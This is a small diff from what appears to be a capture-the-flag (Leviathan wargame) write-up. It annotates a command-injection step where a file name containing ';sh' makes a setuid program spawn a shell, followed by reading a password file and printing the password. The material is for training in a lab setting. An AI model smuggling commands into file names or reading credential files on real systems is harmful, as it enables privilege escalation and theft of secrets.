@@ -184,7 +184,7 @@ $ mkdir /tmp/azerty/
 $ touch "/tmp/azerty/x;sh"
 $ ./printfile "/tmp/azerty/x;sh"
 /bin/cat: /tmp/azerty/x: No such file or directory
-$ whoami
+$ whoami   <==== *from here, this is the shell spawned by the printfile exe*
 leviathan3
 $ cat /etc/leviathan_pass/leviathan3
 Ahdiemoo1j
